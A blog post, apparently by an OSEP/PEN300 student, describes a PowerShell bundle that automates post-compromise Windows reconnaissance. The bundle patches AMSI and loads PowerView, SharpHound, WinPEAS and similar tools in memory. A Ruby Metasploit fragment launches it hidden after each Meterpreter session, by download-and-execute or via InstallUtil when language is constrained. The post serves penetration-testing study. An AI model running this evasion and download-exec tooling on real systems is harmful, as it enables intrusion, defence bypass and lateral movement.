---
title: "Automate the Reconnaissance Phase"
date: 2021-12-02T07:43:03Z
categories: ["Programming", "Security"]
tags: ["OSEP", "PEN300", "Powershell", ".NET Assembly", "C#", "Ruby"]
---

If you have been reading my OSEP (PEN300) post series, you know that I love automating things, reconnaissance phase is one of the repetitive tasks that you do for each machine you compromise right.

In this post, I am going to share with you how I took advantage of the existing scripts and tools to create let's say a reconnaissance script bundle. 

The script is written into Powershell, the language has a rich API and special when it allow us to load .NET Assembly this make it super powerful and the right tool for the task. 

Before we go any further, there is a little caveat here, the script was made for Windows machines only. That being said the way I wrote the script has the following workflow:

- The first step the script does is to patch AMSI
- Checks for writable location so it can save scans result files
- Verify if the script has been run if so it bails
-  Loads in memory the following scripts and tools
	-  PowerView.ps1 (Only if the machine is Domain-Joined)
	-  SharpHound.ps1 (Only if the machine is Domain-Joined)
	-  PowerUPSQL.ps1
	-  PriveCheck.ps1
	-  HostRecon.ps1
	-  WinPEASx64.exe

- Each loaded tools gets executed and its result is save into a file
- Create a ZIP file contain result files in this format username@machine.recon.zip

This script gets executed for each new Meterpreter session, the way the script gets executed depends of the environment, if the for instance the current session has Powershell restricted language enabled the script get executed by leveraging InstallUtils otherwise it gets run from session shell.

```ruby
def is_restricted_language?
	cmd = $powershell.execute_command('$ExecutionContext.SessionState.LanguageMode')
	return true if cmd.include? 'ConstrainedLanguage'
	false
end

def start_powershell_recon_script
	process = nil
	if is_restricted_language?
		print_status("\tPowershell restricted language is enabled")
		process = session.sys.process.execute('C:\\Windows\\System32\\cmd.exe',
		generate_cmd_arg_installutils_instance('recon.exe'), { 'Hidden' => true })
	else
		process = session.sys.process.execute('C:\\Windows\\System32\\cmd.exe',
		generate_cmd_arg_pwsh_download_exec('recon.ps1'), { 'Hidden' => true })
	end
	pid = process.pid
	if pid
		print_good("\tPowershell recon script started running in background: PID #{pid}")
	else
		print_error("\tFailed starting powershell recon script")
	end
end
```

Having this in place, made life more easier, also the advantage of this is that each time you compromise a new credentials, execute an MSF agent so it runs the BloodHound AD reconnaissance, which comes really handy at the lateral movement phase.  

Please note that this script is noisy and not OPSEC safe, it was written to do the heavy lifting for us in internal pentest engagement not for red team engagements.

You can find the full Powershell script here: 

https://gist.github.com/tahadraidia/fca2d202ade39f5296123c69597eedd3

References:
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- https://github.com/NetSPI/PowerUpSQL
- https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
- https://github.com/dafthack/HostRecon/blob/master/HostRecon.ps1
- https://github.com/itm4n/PrivescCheck  
- https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS